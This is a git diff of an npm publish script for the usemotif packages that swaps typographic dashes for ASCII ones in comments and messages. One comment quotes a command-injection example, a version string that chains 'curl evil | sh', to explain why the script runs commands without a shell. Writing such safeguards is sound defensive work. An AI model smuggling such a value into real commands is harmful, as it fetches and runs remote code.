@@ -2,14 +2,14 @@
 /**
  * Publish the usemotif + @usemotif/* packages to npm from a clean local checkout.
  *
- *   node scripts/publish.mjs                   # full run — preflight, build, confirm, publish
+ *   node scripts/publish.mjs                   # full run - preflight, build, confirm, publish
  *   node scripts/publish.mjs --dry-run         # print plan, do nothing
  *   node scripts/publish.mjs --skip-build      # assume dist/ already fresh
  *   node scripts/publish.mjs --skip-checks     # skip git-clean + on-main checks
  *   node scripts/publish.mjs --allow-downgrade # permit publishing an older version than the registry
  *   node scripts/publish.mjs --otp=123456      # pass OTP to each publish (good for ~5min)
  *   node scripts/publish.mjs --tag             # also create v<core-version> git tag
- *   node scripts/publish.mjs --tag --push-tag  # …and push the tag to origin
+ *   node scripts/publish.mjs --tag --push-tag  # ...and push the tag to origin
  *   node scripts/publish.mjs --yes             # skip the interactive confirmation
  *
  * Exits non-zero on the first failure; already-published packages are
@@ -77,7 +77,7 @@ function run(cmd, opts = {}) {
 
 /**
  * Like {@link run}, but argv form (no shell). Use this for any command that
- * interpolates a value — a tag name, a package name — that must never be
+ * interpolates a value - a tag name, a package name - that must never be
  * parsed by a shell. A version string like `1.0.0 && curl evil | sh` reaches
  * `git`/`npm` as a single inert argument here rather than as shell syntax.
  * Throws on a non-zero exit, mirroring `run`'s throw-on-error contract.
@@ -122,7 +122,7 @@ function npmView(name) {
     return NOT_PUBLISHED;
   }
   throw new Error(
-    `npm view ${name} failed and it was not a 404 — refusing to treat it as a new ` +
+    `npm view ${name} failed and it was not a 404 - refusing to treat it as a new ` +
       `package (that could republish existing versions). Original error:\n${detail.trim() || `exit ${r.status}`}`,
   );
 }
@@ -151,7 +151,7 @@ function preflight() {
     const [behind, ahead] = aheadBehind.map((n) => Number.parseInt(n, 10));
     if (ahead > 0) {
       warn(
-        `You are ${ahead} commit(s) ahead of origin/main — these are being published without being pushed.`,
+        `You are ${ahead} commit(s) ahead of origin/main - these are being published without being pushed.`,
       );
     }
     if (behind > 0) {
@@ -183,7 +183,7 @@ function preflight() {
 
 function build() {
   if (SKIP_BUILD) {
-    warn('Skipping build (--skip-build) — assuming dist/ is fresh');
+    warn('Skipping build (--skip-build) - assuming dist/ is fresh');
     return;
   }
   header('Building packages');
@@ -198,7 +198,7 @@ function build() {
 function plan(packages) {
   header('Publish plan');
   const rows = packages.map((p) => {
-    // npmView throws on ambiguous failures — that intentionally aborts the
+    // npmView throws on ambiguous failures - that intentionally aborts the
     // whole run via main().catch rather than silently publishing.
     const viewed = npmView(p.name);
     const isNew = viewed === NOT_PUBLISHED;
@@ -210,7 +210,7 @@ function plan(packages) {
     // against local < published: a stale checkout (local 1.1.2, registry
     // 1.1.4, never re-published) would publish and re-point `latest` to
     // the older release. Classify here so the run can refuse downgrades
-    // and unparseable versions — for every package, not just core.
+    // and unparseable versions - for every package, not just core.
     const bump = isNew ? 'new' : classifyBump(published, p.version);
     const statusColor =
       bump === 'downgrade' || bump === 'unknown'
@@ -266,7 +266,7 @@ function plan(packages) {
   const toPublish = rows.filter((r) => r.published !== r.version);
   const skipped = rows.filter((r) => r.published === r.version);
   if (skipped.length > 0) {
-    log(dim(`  (${skipped.length} already at target version — will be skipped)`));
+    log(dim(`  (${skipped.length} already at target version - will be skipped)`));
   }
   return { rows, toPublish, skipped };
 }
@@ -298,7 +298,7 @@ function publishOne(pkg, versionMap) {
   // rewriteWorkspaceDeps returns the *same* object reference when there are
   // no workspace: deps to rewrite, so an identity check tells us whether a
   // rewrite is actually needed. Compare against the same parsed object we
-  // passed in — the previous code parsed a *second* time, so the references
+  // passed in - the previous code parsed a *second* time, so the references
   // never matched and needsRewrite was always true (harmless, but it
   // rewrote+restored every package's manifest needlessly).
   const parsed = JSON.parse(originalContent);
@@ -334,7 +334,7 @@ function maybeTag(packages) {
   if (!MAKE_TAG) return;
   const core = packages.find((p) => p.name === '@usemotif/core');
   if (!core) {
-    warn('No @usemotif/core found — skipping tag');
+    warn('No @usemotif/core found - skipping tag');
     return;
   }
   const tagName = `v${core.version}`;
@@ -375,13 +375,13 @@ async function main() {
   const { toPublish } = plan(packages);
 
   if (toPublish.length === 0) {
-    success('Nothing to publish — every package is already at its target version.');
+    success('Nothing to publish - every package is already at its target version.');
     return;
   }
 
   const ok = await confirm(
     DRY_RUN
-      ? 'Dry-run — print the publish plan only?'
+      ? 'Dry-run - print the publish plan only?'
       : `Publish ${toPublish.length} package(s) to https://registry.npmjs.org now?`,
   );
   if (!ok) {
@@ -408,7 +408,7 @@ async function main() {
 
   maybeTag(packages);
 
-  success(`Done — ${results.length} package(s) published${MAKE_TAG ? ' + tagged' : ''}.`);
+  success(`Done - ${results.length} package(s) published${MAKE_TAG ? ' + tagged' : ''}.`);
 }
 
 main().catch((err) => {
